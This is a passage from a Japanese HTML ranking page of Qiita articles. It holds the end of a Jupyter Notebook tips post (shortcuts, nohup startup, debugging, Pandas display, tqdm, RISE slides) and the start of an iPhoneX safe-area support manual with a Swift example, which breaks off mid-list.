<td style="text-align: left">Esc → a</td>
<td style="text-align: left">上にセル追加</td>
</tr>
<tr>
<td style="text-align: left">Esc → b</td>
<td style="text-align: left">下にセル追加</td>
</tr>
<tr>
<td style="text-align: left">Esc → dd</td>
<td style="text-align: left">セル削除</td>
</tr>
<tr>
<td style="text-align: left">Esc → l</td>
<td style="text-align: left">行数表示</td>
</tr>
<tr>
<td style="text-align: left">Ctrl + Enter</td>
<td style="text-align: left">セル実行</td>
</tr>
<tr>
<td style="text-align: left">Alt + Enter</td>
<td style="text-align: left">セル実行＋下にセル追加</td>
</tr>
</tbody>
</table>

<blockquote>
<p>追記：2017/9/27 <br>
コメントより、Jupyterのconfig.js内の記載を変更することで、デフォルトで行数表示できると教えていただきました！<br>
$(jupyter --config-dir)/config/config.js </p>

<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span><span class="nx">require</span><span class="p">(</span><span class="s1">'notebook/js/cell'</span><span class="p">).</span><span class="nx">Cell</span><span class="p">.</span><span class="nx">options_default</span><span class="p">.</span><span class="nx">cm_config</span><span class="p">.</span><span class="nx">lineNumbers</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</pre></div></div>
</blockquote>

<h1>
<span id="バックグラウンドジョブで動かす" class="fragment"></span><a href="#%E3%83%90%E3%83%83%E3%82%AF%E3%82%B0%E3%83%A9%E3%82%A6%E3%83%B3%E3%83%89%E3%82%B8%E3%83%A7%E3%83%96%E3%81%A7%E5%8B%95%E3%81%8B%E3%81%99"><i class="fa fa-link"></i></a>バックグラウンドジョブで動かす</h1>

<p>この方法でJupyter Notebookを起動させれば、実行結果が戻ってこなくても、ssh切断して放置しても大丈夫です。</p>

<div class="code-frame" data-lang="bash"><div class="highlight"><pre><span></span>nohup jupyter notebook &gt;&gt; jupyter.log <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">&amp;</span>
</pre></div></div>

<h1>
<span id="デバッグ" class="fragment"></span><a href="#%E3%83%87%E3%83%90%E3%83%83%E3%82%B0"><i class="fa fa-link"></i></a>デバッグ</h1>

<p>ソースの途中で以下のコードを挟むと、ブレークポイントになり、デバッグができます。</p>

<div class="code-frame" data-lang="py3"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">IPython.core.debugger</span> <span class="k">import</span> <span class="n">Pdb</span><span class="p">;</span> <span class="n">Pdb</span><span class="p">()</span><span class="o">.</span><span class="n">set_trace</span><span class="p">()</span>
</pre></div></div>

<p>変数を入力して値を確認したり、ステップインなどができます。<br>
(とはいえ、ちょっと使いにくいと思います)</p>

<p><a href="https://camo.qiitausercontent.com/723492fe4dc26231b06838aa7943c4a8c7c5f536/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3130353333352f39653132323762382d373166352d313435322d633031662d6134343030303166356161642e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/723492fe4dc26231b06838aa7943c4a8c7c5f536/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3130353333352f39653132323762382d373166352d313435322d633031662d6134343030303166356161642e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/105335/9e1227b8-71f5-1452-c01f-a440001f5aad.png"></a></p>

<p>詳しくは<br>
<a href="https://qiita.com/makopo/items/170c939c79dcc5c89e12" id="reference-fbd5365239396cf93bf8">Qiita: JupyterまたはiPython Notebookでデバッグをする方法</a></p>

<h1>
<span id="リモートマシン上で使う" class="fragment"></span><a href="#%E3%83%AA%E3%83%A2%E3%83%BC%E3%83%88%E3%83%9E%E3%82%B7%E3%83%B3%E4%B8%8A%E3%81%A7%E4%BD%BF%E3%81%86"><i class="fa fa-link"></i></a>リモートマシン上で使う</h1>

<p>リモートマシン上にJupyterをインストールして、以下のコマンドでconfigファイルを作成。<br>
configファイルにポートを設定。<br>
リモートのJupyterのポートをトネリングでつないで、ローカルのブラウザから操作できるようになります。</p>

<div class="code-frame" data-lang="bash"><div class="highlight"><pre><span></span>jupyter notebook --generate-config
</pre></div></div>

<p>詳しくは<br>
<a href="https://qiita.com/Miggy/items/5466a2c1e968602f3ebe" id="reference-25c6eb28343ba213018f">Jupyterを導入しよう -リモート編-</a></p>

<h1>
<span id="pandas関連---display" class="fragment"></span><a href="#pandas%E9%96%A2%E9%80%A3---display"><i class="fa fa-link"></i></a>Pandas関連 - display()</h1>

<p>処理の途中でDataFrameを表示させるにはprint()ではなく、display()を使うと罫線つきでいつも通りに表示できます。</p>

<div class="code-frame" data-lang="py3"><div class="highlight"><pre><span></span><span class="n">display</span><span class="p">(</span><span class="n">df</span><span class="p">)</span>
</pre></div></div>

<p><a href="https://camo.qiitausercontent.com/4e98b16e75b748084d51695d1ba78259d38a252c/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3130353333352f35656263636632652d366433342d633466382d303833312d3862343137653339323437302e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/4e98b16e75b748084d51695d1ba78259d38a252c/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3130353333352f35656263636632652d366433342d633466382d303833312d3862343137653339323437302e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/105335/5ebccf2e-6d34-c4f8-0831-8b417e392470.png"></a></p>

<h1>
<span id="pandas関連---set_option" class="fragment"></span><a href="#pandas%E9%96%A2%E9%80%A3---set_option"><i class="fa fa-link"></i></a>Pandas関連 - set_option()</h1>

<p>DataFrameの行や列が多いとデフォルトでは途中のデータが略されてしまいますが、set_optionで最大行数や列数を変更すると表示できます。</p>

<div class="code-frame" data-lang="py3"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">pandas</span> <span class="k">as</span> <span class="nn">pd</span>
<span class="n">pd</span><span class="o">.</span><span class="n">set_option</span><span class="p">(</span><span class="s1">'display.max_rows'</span><span class="p">,</span> <span class="mi">500</span><span class="p">)</span>
</pre></div></div>

<p>参考<br>
<a href="http://songhuiming.github.io/pages/2017/04/02/jupyter-and-pandas-display/" class="autolink" rel="nofollow noopener" target="_blank">http://songhuiming.github.io/pages/2017/04/02/jupyter-and-pandas-display/</a></p>

<h1>
<span id="pandas関連---tqdm" class="fragment"></span><a href="#pandas%E9%96%A2%E9%80%A3---tqdm"><i class="fa fa-link"></i></a>Pandas関連 - tqdm</h1>

<p>tqdmを使うとapplyの進捗を可視化して確認できます。もちろんfor文などでも使えます。<br>
重い処理中、いつ終わるかそわそわしなくて済みます。</p>

<p><a href="https://github.com/tqdm/tqdm" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/tqdm/tqdm</a></p>

<div class="code-frame" data-lang="bash"><div class="highlight"><pre><span></span><span class="c1"># install</span>
pip install tqdm
</pre></div></div>

<p><a href="https://camo.qiitausercontent.com/06f073dbdc7beafe41ffcb64c1ea7328c0203da8/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3130353333352f32656538313863652d373664392d303834332d396261662d3132626564333065353831642e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/06f073dbdc7beafe41ffcb64c1ea7328c0203da8/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3130353333352f32656538313863652d373664392d303834332d396261662d3132626564333065353831642e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/105335/2ee818ce-76d9-0843-9baf-12bed30e581d.png"></a></p>

<p>参考<br>
<a href="http://wonderwall.hatenablog.com/entry/2017/07/23/222856" class="autolink" rel="nofollow noopener" target="_blank">http://wonderwall.hatenablog.com/entry/2017/07/23/222856</a></p>

<blockquote>
<p>追記：2017/9/27 <br>
コメントより、tqdm_notebookというのがあると教えてもらいました！<br>
こちらの方がプログレスバーが綺麗で見やすいです。</p>

<div class="code-frame" data-lang="py3"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">tqdm</span> <span class="k">import</span> <span class="n">tqdm_notebook</span> <span class="k">as</span> <span class="n">tqdm</span>
</pre></div></div>
</blockquote>

<h1>
<span id="html記載" class="fragment"></span><a href="#html%E8%A8%98%E8%BC%89"><i class="fa fa-link"></i></a>HTML記載</h1>

<p>マークダウンセルは、HTMLも書けます。<br>
レポートを綺麗に書きたいときに使えます。</p>

<p><a href="https://camo.qiitausercontent.com/d57e93509b943cc586134f61c53b25e4555d984f/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3130353333352f35366438356561312d313963662d653831632d616131642d6536653737333739306665612e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/d57e93509b943cc586134f61c53b25e4555d984f/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3130353333352f35366438356561312d313963662d653831632d616131642d6536653737333739306665612e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/105335/56d85ea1-19cf-e81c-aa1d-e6e773790fea.png"></a></p>

<p><a href="https://camo.qiitausercontent.com/417a4dae60b5ae0d4969cac40434ec4155369d81/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3130353333352f39333366346165312d353431332d336638362d343935642d3639313264646630323332392e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/417a4dae60b5ae0d4969cac40434ec4155369d81/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3130353333352f39333366346165312d353431332d336638362d343935642d3639313264646630323332392e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/105335/933f4ae1-5413-3f86-495d-6912ddf02329.png"></a></p>

<h1>
<span id="スライド化" class="fragment"></span><a href="#%E3%82%B9%E3%83%A9%E3%82%A4%E3%83%89%E5%8C%96"><i class="fa fa-link"></i></a>スライド化</h1>

<p>RISEを使うと、Jupyterのセルをスライド化できます。分析結果をプレゼントする時に便利です。</p>

<p>①　[View]-[Cell Toolbar]-[Slideshow]を選択<br>
②　各セルの右上の[Slide Type]を選択<br>
③　Slideshowボタンをクリック</p>

<p><a href="https://github.com/damianavila/RISE" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/damianavila/RISE</a></p>

<div class="code-frame" data-lang="bash"><div class="highlight"><pre><span></span><span class="c1"># install</span>
pip install RISE
jupyter-nbextension install rise --py --sys-prefix
jupyter-nbextension <span class="nb">enable</span> rise --py --sys-prefix
</pre></div></div>

<p><a href="https://camo.qiitausercontent.com/6414eb9dbb29aaa5918b6a026c8a69b6af414623/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3130353333352f33663335333664382d663363332d343438352d646261362d3230393834303565646563362e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/6414eb9dbb29aaa5918b6a026c8a69b6af414623/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3130353333352f33663335333664382d663363332d343438352d646261362d3230393834303565646563362e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/105335/3f3536d8-f3c3-4485-dba6-2098405edec6.png"></a></p>

<p>参考<br>
<a href="https://qiita.com/cvusk/items/d425751ba663dc8c6517" id="reference-6ece8c8a962d30882c0a">Qiita: Jupyter Notebookでプレゼンをするとっても便利な方法</a></p>

<h1>
<span id="おわり" class="fragment"></span><a href="#%E3%81%8A%E3%82%8F%E3%82%8A"><i class="fa fa-link"></i></a>おわり</h1>

<p>他の方の記事のまとめになってしまいましたが、これからJupyter Notebookを使い始める方の参考になれたら嬉しいです。<br>
もっと使いこなしていきたいです。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">68位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>156</kbd>
		<a target="_blank" href="https://qiita.com/cokaholic/items/6a8ee3852c8ed28ea2aa">【随時更新】iPhoneX完全対応マニュアル</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-27<br />19:26:52</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/46227.html">cokaholic</a>(6件の記事)<br />(株式会社サイバーエージェント 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/46227/profile-images/1490701946">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Xcode]</b> <b>[iOS]</b> <b>[Swift]</b> <b>[ios11]</b> <b>[iPhoneX]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="はじめに" class="fragment"></span><a href="#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB"><i class="fa fa-link"></i></a>はじめに</h1>

<p>この記事は既存、もしくは新規で開発するiOSアプリをiPhoneXに対応するための知見をまとめたものです。<br>
新しい情報やTipsをコメントいただけると随時更新させていただきますので、よろしくお願いします！</p>

<h2>
<span id="iphonexについて" class="fragment"></span><a href="#iphonex%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6"><i class="fa fa-link"></i></a>iPhoneXについて</h2>

<ul>
<li>2017年9月12日に開催されたApple Special Eventにて発表された最新のiPhone</li>
<li>顔認証でロック解除ができる「Face ID」を搭載</li>
<li>
<strong>ベゼルレスディスプレイ</strong>

<ul>
<li>今までのデバイスと違って、<strong>四隅が丸くなっていたり、フロントカメラ部分の凹みがディスプレイに被っていたりする</strong>ので、このようなディスプレイに対応するために<strong>セーフエリア</strong>の概念が新しく追加された</li>
</ul>
</li>
</ul>

<p><a href="https://camo.qiitausercontent.com/8552738048910cdbe0b67e22bb6db6bb7f68a338/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34363232372f64313466663939312d343838622d393266342d353262342d3336653330383735323666352e706e67" target="_blank" rel="nofollow noopener"><img width="750" alt="iPhoneXの凹み" src="https://camo.qiitausercontent.com/8552738048910cdbe0b67e22bb6db6bb7f68a338/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34363232372f64313466663939312d343838622d393266342d353262342d3336653330383735323666352e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/46227/d14ff991-488b-92f4-52b4-36e3087526f5.png"></a></p>

<h2>
<span id="セーフエリアについて" class="fragment"></span><a href="#%E3%82%BB%E3%83%BC%E3%83%95%E3%82%A8%E3%83%AA%E3%82%A2%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6"><i class="fa fa-link"></i></a>セーフエリアについて</h2>

<ul>
<li>AppleがiOS11から導入した概念</li>
<li>ナビゲーションバーやステータスバーなどの外側のUIに被らない安全な領域を取得できる</li>
<li>使用するには<strong>Xcode9+、iOS11+ SDK</strong>が必要</li>
<li>セーフエリアの領域やマージン幅については<a href="https://qiita.com/usagimaru">usagimaruさん</a>の以下の記事がとても参考になる

<ul>
<li><a href="https://qiita.com/usagimaru/items/761e9a5f3d78b1939df8" id="reference-1f116f39fc3715775c22">iPhone Xのセーフエリアやマージン幅について - Qiita</a></li>
</ul>
</li>
</ul>

<p><a href="https://camo.qiitausercontent.com/f2de12689f946fff8a2d8fe17fbce74ee7a44301/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34363232372f32316334386135632d663136382d626134662d333765372d6134316263303337396436622e706e67" target="_blank" rel="nofollow noopener"><img width="750" alt="セーフエリア" src="https://camo.qiitausercontent.com/f2de12689f946fff8a2d8fe17fbce74ee7a44301/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34363232372f32316334386135632d663136382d626134662d333765372d6134316263303337396436622e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/46227/21c48a5c-f168-ba4f-37e7-a41bc0379d6b.png"></a></p>

<h1>
<span id="iphonex対応-tips集" class="fragment"></span><a href="#iphonex%E5%AF%BE%E5%BF%9C-tips%E9%9B%86"><i class="fa fa-link"></i></a>iPhoneX対応 Tips集</h1>

<p>ここからは対応するためのTipsを紹介していきます。</p>

<h2>
<span id="storyboardでセーフエリアを有効にするには" class="fragment"></span><a href="#storyboard%E3%81%A7%E3%82%BB%E3%83%BC%E3%83%95%E3%82%A8%E3%83%AA%E3%82%A2%E3%82%92%E6%9C%89%E5%8A%B9%E3%81%AB%E3%81%99%E3%82%8B%E3%81%AB%E3%81%AF"><i class="fa fa-link"></i></a>Storyboardでセーフエリアを有効にするには</h2>

<ol>
<li>任意のStoryboardを開く</li>
<li>右側にあるInterface Builderのインスペクタを開く</li>
<li>「<strong>Use Safe Area Layout Guides</strong>」のチェックをONにする</li>
<li>セーフエリア(UILayoutGuide) が追加される</li>
</ol>

<p><a href="https://camo.qiitausercontent.com/2ad1a5f2aa08b4dafa4d46843a5efdc44797fe15/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34363232372f36663532653030312d366633642d643936652d623262612d3737373539613435353032302e706e67" target="_blank" rel="nofollow noopener"><img width="300" alt="Use Safe Area Layout Guidesのチェッカー" src="https://camo.qiitausercontent.com/2ad1a5f2aa08b4dafa4d46843a5efdc44797fe15/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34363232372f36663532653030312d366633642d643936652d623262612d3737373539613435353032302e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/46227/6f52e001-6f3d-d96e-b2ba-77759a455020.png"></a></p>

<ul>
<li>セーフエリアを有効にしていなかったStoryboardでセーフエリアを有効にすると、Top Layout GuideやBottom Layout Guideに接続していたビューは自動でセーフエリアのTop、Bottomに差し替えてくれる</li>
</ul>

<p><a href="https://camo.qiitausercontent.com/2f234e5d00a0749fac1285e31cb43d7368359d4e/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34363232372f35643662393439662d306633612d393761382d316564662d3062313865346163373764642e706e67" target="_blank" rel="nofollow noopener"><img width="750" alt="セーフエリアの適用前後" src="https://camo.qiitausercontent.com/2f234e5d00a0749fac1285e31cb43d7368359d4e/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34363232372f35643662393439662d306633612d393761382d316564662d3062313865346163373764642e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/46227/5d6b949f-0f3a-97a8-1edf-0b18e4ac77dd.png"></a></p>

<h2>
<span id="ソースコード上からセーフエリアを取得したい" class="fragment"></span><a href="#%E3%82%BD%E3%83%BC%E3%82%B9%E3%82%B3%E3%83%BC%E3%83%89%E4%B8%8A%E3%81%8B%E3%82%89%E3%82%BB%E3%83%BC%E3%83%95%E3%82%A8%E3%83%AA%E3%82%A2%E3%82%92%E5%8F%96%E5%BE%97%E3%81%97%E3%81%9F%E3%81%84"><i class="fa fa-link"></i></a>ソースコード上からセーフエリアを取得したい</h2>

<ul>
<li>iOS11からは上記のStoryboardでセーフエリアを有効にしたときに追加されるUILayoutGuideがUIViewのプロパティに <a href="https://developer.apple.com/documentation/uikit/uiview/2891102-safearealayoutguide" rel="nofollow noopener" target="_blank"><strong>safeAreaLayoutGuide (UILayoutGuide)</strong></a> として追加されている</li>
<li>iOS11からはUIViewのプロパティに <a href="https://developer.apple.com/documentation/uikit/uiview/2891103-safeareainsets" rel="nofollow noopener" target="_blank"><strong>safeAreaInsets (UIEdgeInsets)</strong></a> が追加されていて、そこからセーフエリアのマージンを取得できる</li>
<li>iOS11+しか使えないプロパティのため、<strong> #available(iOS 11, *) での分岐</strong>が必要</li>
<li>以下の<a href="https://qiita.com/hituziando">hituziandoさん</a>の記事によると、UIViewControllerのライフサイクルで一番最初にsafeAreaInsetsが確定するのは<strong>viewWillLayoutSubviews</strong>

<ul>
<li><a href="https://qiita.com/hituziando/items/e5873b5bfa42247071e6" id="reference-1beec3824e77ae0c015c">【iOS11】safeAreaInsetsの値が取得できるタイミング</a></li>
</ul>
</li>
</ul>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">ViewController.swift</span></div>
<div class="highlight"><pre><span></span><span class="kd">import</span> <span class="nc">UIKit</span>

<span class="kd">class</span> <span class="nc">ViewController</span><span class="p">:</span> <span class="bp">UIViewController</span> <span class="p">{</span>

    <span class="kr">override</span> <span class="kd">func</span> <span class="nf">viewWillLayoutSubviews</span><span class="p">()</span> <span class="p">{</span>
        <span class="kc">super</span><span class="p">.</span><span class="n">viewWillLayoutSubviews</span><span class="p">()</span>

        <span class="c1">// iOS11かどうかで分岐する</span>
        <span class="kd">let</span> <span class="nv">safeAreaInsets</span><span class="p">:</span> <span class="bp">UIEdgeInsets</span>
        <span class="k">if</span> <span class="cp">#available</span><span class="p">(</span><span class="cp">iOS</span> <span class="mi">11</span><span class="p">,</span> <span class="o">*</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">safeAreaInsets</span> <span class="p">=</span> <span class="n">view</span><span class="p">.</span><span class="n">safeAreaInsets</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="n">safeAreaInsets</span> <span class="p">=</span> <span class="p">.</span><span class="n">zero</span>
        <span class="p">}</span>
        <span class="bp">print</span><span class="p">(</span><span class="s">"safeAreaInsets: </span><span class="si">\(</span><span class="n">safeAreaInsets</span><span class="si">)</span><span class="s">"</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<h2>
<span id="ソースコード上からセーフエリアの変化を感知したい" class="fragment"></span><a href="#%E3%82%BD%E3%83%BC%E3%82%B9%E3%82%B3%E3%83%BC%E3%83%89%E4%B8%8A%E3%81%8B%E3%82%89%E3%82%BB%E3%83%BC%E3%83%95%E3%82%A8%E3%83%AA%E3%82%A2%E3%81%AE%E5%A4%89%E5%8C%96%E3%82%92%E6%84%9F%E7%9F%A5%E3%81%97%E3%81%9F%E3%81%84"><i class="fa fa-link"></i></a>ソースコード上からセーフエリアの変化を感知したい</h2>

<ul>
<li>iOS11からはセーフエリアの変化を感知するために<strong>UIView</strong>に <strong>open func safeAreaInsetsDidChange()</strong> が、<strong>UIViewController</strong>に <strong>open func viewSafeAreaInsetsDidChange()</strong> が追加されている

<ul>
<li>それぞれ、オーバーライドすることで、メソッド内でセーフエリアの変化を感知できる</li>
</ul>
</li>
<li>このメソッドを便利に使えるようにする拡張方法などは<a href="https://qiita.com/marty-suzuki">marty-suzukiさん</a>の以下の記事が参考になる

<ul>
<li><a href="https://qiita.com/marty-suzuki/items/f3dcab7624c9079d74ab" id="reference-64cbe7f30f592965c546">safeAreaInsetsの変更を感知する - Qiita</a></li>
</ul>
</li>
</ul>

<h2>
<span id="セーフエリアだけで切り取るだけのデザインは非推奨" class="fragment"></span><a href="#%E3%82%BB%E3%83%BC%E3%83%95%E3%82%A8%E3%83%AA%E3%82%A2%E3%81%A0%E3%81%91%E3%81%A7%E5%88%87%E3%82%8A%E5%8F%96%E3%82%8B%E3%81%A0%E3%81%91%E3%81%AE%E3%83%87%E3%82%B6%E3%82%A4%E3%83%B3%E3%81%AF%E9%9D%9E%E6%8E%A8%E5%A5%A8"><i class="fa fa-link"></i></a>セーフエリアだけで切り取るだけのデザインは非推奨</h2>

<ul>
<li>上下に常に黒いバーが存在するような、セーフエリアで切り取るだけのデザインのアプリは<strong>Appleが提供する標準アプリと矛盾したデザインになってしまうため</strong>、非推奨となっている</li>
</ul>

<p><a href="https://camo.qiitausercontent.com/0563fed586e412a77342ada9a3eba49051c8dde4/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34363232372f31636261363631382d383737382d653238632d336332622d6433306363663261653962632e706e67" target="_blank" rel="nofollow noopener"><img width="750" alt="切り取るだけは非推奨" src="https://camo.qiitausercontent.com/0563fed586e412a77342ada9a3eba49051c8dde4/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34363232372f31636261363631382d383737382d653238632d336332622d6433306363663261653962632e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/46227/1cba6618-8778-e28c-3c2b-d30ccf2ae9bc.png"></a></p>

<ul>
<li>以下の画像のように、<strong>上下の背景とコンテンツが溶け込むような意識</strong>をする必要がある</li>
</ul>

<p><a href="https://camo.qiitausercontent.com/417a95023c7c9a1d9483148b33531df609b1a723/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34363232372f63313136343538302d666163612d303566372d376266632d3965633566353632343333662e706e67" target="_blank" rel="nofollow noopener"><img width="750" alt="Appleの提供する標準アプリの例" src="https://camo.qiitausercontent.com/417a95023c7c9a1d9483148b33531df609b1a723/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34363232372f63313136343538302d666163612d303566372d376266632d3965633566353632343333662e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/46227/c1164580-faca-05f7-7bfc-9ec5f562433f.png"></a></p>

<h2>
<span id="必要な箇所でclipstoboundsがtrueになっているかを注意する" class="fragment"></span><a href="#%E5%BF%85%E8%A6%81%E3%81%AA%E7%AE%87%E6%89%80%E3%81%A7clipstobounds%E3%81%8Ctrue%E3%81%AB%E3%81%AA%E3%81%A3%E3%81%A6%E3%81%84%E3%82%8B%E3%81%8B%E3%82%92%E6%B3%A8%E6%84%8F%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>必要な箇所でclipsToBoundsがtrueになっているかを注意する</h2>

<ul>
<li>今までのデバイスだと、ディスプレイの外に配置しておけば見えなくなるので、安心して画面外に置いていたビューが、セーフエリアによってあられもない姿にされてしまう</li>
<li>見切れさせたくない箇所は、しっかりと<strong>clipsToBoundsをtrueに</strong>しておく必要がある</li>
</ul>

<p><a href="https://camo.qiitausercontent.com/092ee2edb8b389823ce8159e536d673cb19b1bb8/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34363232372f36393037316639662d323835362d663933652d396465322d6134653835313738303531312e706e67" target="_blank" rel="nofollow noopener"><img width="750" alt="clipsToBoundsの見直し" src="https://camo.qiitausercontent.com/092ee2edb8b389823ce8159e536d673cb19b1bb8/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34363232372f36393037316639662d323835362d663933652d396465322d6134653835313738303531312e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/46227/69071f9f-2856-f93e-9de2-a4e851780511.png"></a></p>

<h2>
<span id="コンテンツをフルスクリーン表示する際にはアスペクト比を保つ" class="fragment"></span><a href="#%E3%82%B3%E3%83%B3%E3%83%86%E3%83%B3%E3%83%84%E3%82%92%E3%83%95%E3%83%AB%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%BC%E3%83%B3%E8%A1%A8%E7%A4%BA%E3%81%99%E3%82%8B%E9%9A%9B%E3%81%AB%E3%81%AF%E3%82%A2%E3%82%B9%E3%83%9A%E3%82%AF%E3%83%88%E6%AF%94%E3%82%92%E4%BF%9D%E3%81%A4"><i class="fa fa-link"></i></a>コンテンツをフルスクリーン表示する際にはアスペクト比を保つ</h2>

<ul>
<li>iPhoneXでコンテンツをフルスクリーンで表示する際には、iPhone8を基準にした場合、<strong>左右を切り取って上下を埋めて表示するか、左右を合わせて上下を凹ませて表示するか</strong>して、アスペクト比は保つようにする必要がある</li>
</ul>

<p><a href="https://camo.qiitausercontent.com/b607f4ea8f9f1ea7682887aa56f5685ab9c8f547/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34363232372f66623563333866352d366233382d663634302d333636362d6563396362383339383734302e706e67" target="_blank" rel="nofollow noopener"><img width="750" alt="コンテンツをフルスクリーン表示する際にはアスペクト比を保つ" src="https://camo.qiitausercontent.com/b607f4ea8f9f1ea7682887aa56f5685ab9c8f547/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34363232372f66623563333866352d366233382d663634302d333636362d6563396362383339383734302e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/46227/fb5c38f5-6b38-f640-3666-ec9cb8398740.png"></a></p>

<h2>
<span id="iphonexの下のバーを消したい" class="fragment"></span><a href="#iphonex%E3%81%AE%E4%B8%8B%E3%81%AE%E3%83%90%E3%83%BC%E3%82%92%E6%B6%88%E3%81%97%E3%81%9F%E3%81%84"><i class="fa fa-link"></i></a>iPhoneXの下のバーを消したい</h2>

<ul>
<li>バーの正式名称は<strong>Home Indicator</strong>
</li>
<li>iOS11からはHome Indicatorを非表示にするためのメソッド(<code>open func prefersHomeIndicatorAutoHidden() -&gt; Bool</code>)が<strong>UIViewController</strong>に追加されている

<ul>
<li>オーバーライドしてtrueを返せば、Home Indicatorは<strong>画面に一定時間触らなければ</strong>、自動的に非表示になる</li>
<li>非表示になってから画面に触れると、Home Indocatorはすぐに表示される</li>
</ul>
</li>
